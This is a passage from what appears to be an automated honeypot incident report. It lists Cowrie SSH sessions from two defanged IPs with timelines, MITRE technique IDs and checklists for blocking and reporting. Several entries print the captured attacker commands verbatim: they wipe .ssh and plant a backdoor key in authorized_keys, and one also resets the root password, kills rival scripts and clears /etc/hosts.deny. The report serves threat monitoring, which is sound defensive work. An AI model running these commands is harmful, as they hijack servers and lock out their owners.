| `2026-04-16 04:20:09` | `cowrie.log.closed` |
| `2026-04-16 04:20:09` | `cowrie.session.params` |
| `2026-04-16 04:20:09` | `cowrie.command.input` |
| `2026-04-16 04:20:09` | `cowrie.log.closed` |
| `2026-04-16 04:20:10` | `cowrie.session.params` |
| `2026-04-16 04:20:10` | `cowrie.command.input` |
| `2026-04-16 04:20:11` | `cowrie.log.closed` |
| `2026-04-16 04:20:11` | `cowrie.session.params` |
| `2026-04-16 04:20:11` | `cowrie.command.input` |
| `2026-04-16 04:20:11` | `cowrie.log.closed` |
| `2026-04-16 04:20:12` | `cowrie.session.params` |
| `2026-04-16 04:20:12` | `cowrie.command.input` |
| `2026-04-16 04:20:12` | `cowrie.log.closed` |
| `2026-04-16 04:20:19` | `cowrie.session.params` |
| `2026-04-16 04:20:19` | `cowrie.command.input` |
| `2026-04-16 04:20:19` | `cowrie.log.closed` |
| `2026-04-16 04:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.122[.]90` to AbuseIPDB if not already reported
- [ ] Block `14.103.122[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93fd0e818b0e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.122[.]90` |
| **First Seen** | 2026-04-16 04:29 |
| **Last Seen** | 2026-04-16 04:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:GvQ2GGPEfSJC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:29:23` | `cowrie.session.connect` |
| `2026-04-16 04:29:23` | `cowrie.client.version` |
| `2026-04-16 04:29:24` | `cowrie.client.kex` |
| `2026-04-16 04:29:24` | `cowrie.login.success` |
| `2026-04-16 04:29:25` | `cowrie.session.params` |
| `2026-04-16 04:29:25` | `cowrie.command.input` |
| `2026-04-16 04:29:25` | `cowrie.command.failed` |
| `2026-04-16 04:29:25` | `cowrie.log.closed` |
| `2026-04-16 04:29:25` | `cowrie.session.params` |
| `2026-04-16 04:29:25` | `cowrie.command.input` |
| `2026-04-16 04:29:27` | `cowrie.session.file_download` |
| `2026-04-16 04:29:27` | `cowrie.log.closed` |
| `2026-04-16 04:29:38` | `cowrie.session.params` |
| `2026-04-16 04:29:38` | `cowrie.command.input` |
| `2026-04-16 04:29:38` | `cowrie.log.closed` |
| `2026-04-16 04:29:39` | `cowrie.session.params` |
| `2026-04-16 04:29:39` | `cowrie.command.input` |
| `2026-04-16 04:29:39` | `cowrie.log.closed` |
| `2026-04-16 04:29:39` | `cowrie.session.params` |
| `2026-04-16 04:29:39` | `cowrie.command.input` |
| `2026-04-16 04:29:39` | `cowrie.session.file_download` |
| `2026-04-16 04:29:39` | `cowrie.log.closed` |
| `2026-04-16 04:29:40` | `cowrie.session.params` |
| `2026-04-16 04:29:40` | `cowrie.command.input` |
| `2026-04-16 04:29:40` | `cowrie.log.closed` |
| `2026-04-16 04:29:41` | `cowrie.session.params` |
| `2026-04-16 04:29:41` | `cowrie.command.input` |
| `2026-04-16 04:29:41` | `cowrie.log.closed` |
| `2026-04-16 04:29:42` | `cowrie.session.params` |
| `2026-04-16 04:29:42` | `cowrie.command.input` |
| `2026-04-16 04:29:42` | `cowrie.command.input` |
| `2026-04-16 04:29:42` | `cowrie.log.closed` |
| `2026-04-16 04:29:43` | `cowrie.session.params` |
| `2026-04-16 04:29:43` | `cowrie.command.input` |
| `2026-04-16 04:29:43` | `cowrie.log.closed` |
| `2026-04-16 04:29:43` | `cowrie.session.params` |
| `2026-04-16 04:29:43` | `cowrie.command.input` |
| `2026-04-16 04:29:44` | `cowrie.log.closed` |
| `2026-04-16 04:29:44` | `cowrie.session.params` |
| `2026-04-16 04:29:44` | `cowrie.command.input` |
| `2026-04-16 04:29:45` | `cowrie.log.closed` |
| `2026-04-16 04:29:45` | `cowrie.session.params` |
| `2026-04-16 04:29:45` | `cowrie.command.input` |
| `2026-04-16 04:29:45` | `cowrie.log.closed` |
| `2026-04-16 04:29:45` | `cowrie.session.params` |
| `2026-04-16 04:29:45` | `cowrie.command.input` |
| `2026-04-16 04:29:46` | `cowrie.log.closed` |
| `2026-04-16 04:29:46` | `cowrie.session.params` |
| `2026-04-16 04:29:46` | `cowrie.command.input` |
| `2026-04-16 04:29:48` | `cowrie.log.closed` |
| `2026-04-16 04:29:48` | `cowrie.session.params` |
| `2026-04-16 04:29:48` | `cowrie.command.input` |
| `2026-04-16 04:29:48` | `cowrie.log.closed` |
| `2026-04-16 04:29:49` | `cowrie.session.params` |
| `2026-04-16 04:29:49` | `cowrie.command.input` |
| `2026-04-16 04:29:49` | `cowrie.log.closed` |
| `2026-04-16 04:29:49` | `cowrie.session.params` |
| `2026-04-16 04:29:49` | `cowrie.command.input` |
| `2026-04-16 04:29:49` | `cowrie.log.closed` |
| `2026-04-16 04:29:56` | `cowrie.session.params` |
| `2026-04-16 04:29:56` | `cowrie.command.input` |
| `2026-04-16 04:29:56` | `cowrie.log.closed` |
| `2026-04-16 04:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.122[.]90` to AbuseIPDB if not already reported
- [ ] Block `14.103.122[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa85526e159e

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:42 |
| **Last Seen** | 2026-04-16 04:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:42:47` | `cowrie.session.connect` |
| `2026-04-16 04:42:47` | `cowrie.client.version` |
| `2026-04-16 04:42:47` | `cowrie.client.kex` |
| `2026-04-16 04:42:49` | `cowrie.login.success` |
| `2026-04-16 04:42:49` | `cowrie.session.params` |
| `2026-04-16 04:42:49` | `cowrie.command.input` |
| `2026-04-16 04:42:49` | `cowrie.command.failed` |
| `2026-04-16 04:42:50` | `cowrie.log.closed` |
| `2026-04-16 04:42:50` | `cowrie.session.params` |
| `2026-04-16 04:42:50` | `cowrie.command.input` |
| `2026-04-16 04:42:51` | `cowrie.session.file_download` |
| `2026-04-16 04:42:51` | `cowrie.log.closed` |
| `2026-04-16 04:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db7f8eba880e

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:42 |
| **Last Seen** | 2026-04-16 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:42:55` | `cowrie.session.connect` |
| `2026-04-16 04:42:55` | `cowrie.client.version` |
| `2026-04-16 04:42:55` | `cowrie.client.kex` |
| `2026-04-16 04:42:56` | `cowrie.login.success` |
| `2026-04-16 04:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af87a51aa69

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:46 |
| **Last Seen** | 2026-04-16 04:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:46:13` | `cowrie.session.connect` |
| `2026-04-16 04:46:13` | `cowrie.client.version` |
| `2026-04-16 04:46:13` | `cowrie.client.kex` |
| `2026-04-16 04:46:15` | `cowrie.login.success` |
| `2026-04-16 04:46:15` | `cowrie.session.params` |
| `2026-04-16 04:46:15` | `cowrie.command.input` |
| `2026-04-16 04:46:15` | `cowrie.command.failed` |
| `2026-04-16 04:46:16` | `cowrie.log.closed` |
| `2026-04-16 04:46:16` | `cowrie.session.params` |
| `2026-04-16 04:46:16` | `cowrie.command.input` |
| `2026-04-16 04:46:17` | `cowrie.session.file_download` |
| `2026-04-16 04:46:17` | `cowrie.log.closed` |
| `2026-04-16 04:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4a7cf92b398

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:46 |
| **Last Seen** | 2026-04-16 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:46:20` | `cowrie.session.connect` |
| `2026-04-16 04:46:20` | `cowrie.client.version` |
| `2026-04-16 04:46:21` | `cowrie.client.kex` |
| `2026-04-16 04:46:22` | `cowrie.login.success` |
| `2026-04-16 04:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b3bb22d71f0

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:47 |
| **Last Seen** | 2026-04-16 04:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:47:53` | `cowrie.session.connect` |
| `2026-04-16 04:47:53` | `cowrie.client.version` |
| `2026-04-16 04:47:53` | `cowrie.client.kex` |
| `2026-04-16 04:47:55` | `cowrie.login.success` |
| `2026-04-16 04:47:55` | `cowrie.session.params` |
| `2026-04-16 04:47:55` | `cowrie.command.input` |
| `2026-04-16 04:47:55` | `cowrie.command.failed` |
| `2026-04-16 04:47:56` | `cowrie.log.closed` |
| `2026-04-16 04:47:56` | `cowrie.session.params` |
| `2026-04-16 04:47:56` | `cowrie.command.input` |
| `2026-04-16 04:47:57` | `cowrie.session.file_download` |
| `2026-04-16 04:47:57` | `cowrie.log.closed` |
| `2026-04-16 04:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31710e4a469d

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:48 |
| **Last Seen** | 2026-04-16 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:48:00` | `cowrie.session.connect` |
| `2026-04-16 04:48:00` | `cowrie.client.version` |
| `2026-04-16 04:48:00` | `cowrie.client.kex` |
| `2026-04-16 04:48:02` | `cowrie.login.success` |
| `2026-04-16 04:48:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b7e992b129

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:52 |
| **Last Seen** | 2026-04-16 04:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:52:45` | `cowrie.session.connect` |
| `2026-04-16 04:52:45` | `cowrie.client.version` |
| `2026-04-16 04:52:46` | `cowrie.client.kex` |
| `2026-04-16 04:52:47` | `cowrie.login.success` |
| `2026-04-16 04:52:47` | `cowrie.session.params` |
| `2026-04-16 04:52:47` | `cowrie.command.input` |
| `2026-04-16 04:52:48` | `cowrie.command.failed` |
| `2026-04-16 04:52:48` | `cowrie.log.closed` |
| `2026-04-16 04:52:48` | `cowrie.session.params` |
| `2026-04-16 04:52:48` | `cowrie.command.input` |
| `2026-04-16 04:52:49` | `cowrie.session.file_download` |
| `2026-04-16 04:52:49` | `cowrie.log.closed` |
| `2026-04-16 04:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed8642e97153

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:52 |
| **Last Seen** | 2026-04-16 04:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:52:52` | `cowrie.session.connect` |
| `2026-04-16 04:52:52` | `cowrie.client.version` |
| `2026-04-16 04:52:53` | `cowrie.client.kex` |
| `2026-04-16 04:52:54` | `cowrie.login.success` |
| `2026-04-16 04:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-337c8150888b

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:54 |
| **Last Seen** | 2026-04-16 04:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:54:22` | `cowrie.session.connect` |
| `2026-04-16 04:54:22` | `cowrie.client.version` |
| `2026-04-16 04:54:22` | `cowrie.client.kex` |
| `2026-04-16 04:54:23` | `cowrie.login.success` |
| `2026-04-16 04:54:24` | `cowrie.session.params` |
| `2026-04-16 04:54:24` | `cowrie.command.input` |
| `2026-04-16 04:54:24` | `cowrie.command.failed` |
| `2026-04-16 04:54:24` | `cowrie.log.closed` |
| `2026-04-16 04:54:25` | `cowrie.session.params` |
| `2026-04-16 04:54:25` | `cowrie.command.input` |
| `2026-04-16 04:54:25` | `cowrie.session.file_download` |
| `2026-04-16 04:54:25` | `cowrie.log.closed` |
| `2026-04-16 04:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-757ec453dad3

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:54 |
| **Last Seen** | 2026-04-16 04:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:54:29` | `cowrie.session.connect` |
| `2026-04-16 04:54:29` | `cowrie.client.version` |
| `2026-04-16 04:54:29` | `cowrie.client.kex` |
| `2026-04-16 04:54:31` | `cowrie.login.success` |
| `2026-04-16 04:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0038dce878e2

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:55 |
| **Last Seen** | 2026-04-16 04:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:55:56` | `cowrie.session.connect` |
| `2026-04-16 04:55:56` | `cowrie.client.version` |
| `2026-04-16 04:55:56` | `cowrie.client.kex` |
| `2026-04-16 04:55:58` | `cowrie.login.success` |
| `2026-04-16 04:55:58` | `cowrie.session.params` |
| `2026-04-16 04:55:58` | `cowrie.command.input` |
| `2026-04-16 04:55:58` | `cowrie.command.failed` |
| `2026-04-16 04:55:59` | `cowrie.log.closed` |
| `2026-04-16 04:55:59` | `cowrie.session.params` |
| `2026-04-16 04:55:59` | `cowrie.command.input` |
| `2026-04-16 04:56:00` | `cowrie.session.file_download` |
| `2026-04-16 04:56:00` | `cowrie.log.closed` |
| `2026-04-16 04:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc6cf5370f2f

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 04:56 |
| **Last Seen** | 2026-04-16 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 04:56:03` | `cowrie.session.connect` |
| `2026-04-16 04:56:03` | `cowrie.client.version` |
| `2026-04-16 04:56:04` | `cowrie.client.kex` |
| `2026-04-16 04:56:05` | `cowrie.login.success` |
| `2026-04-16 04:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6c5da0747f

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 05:00 |
| **Last Seen** | 2026-04-16 05:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
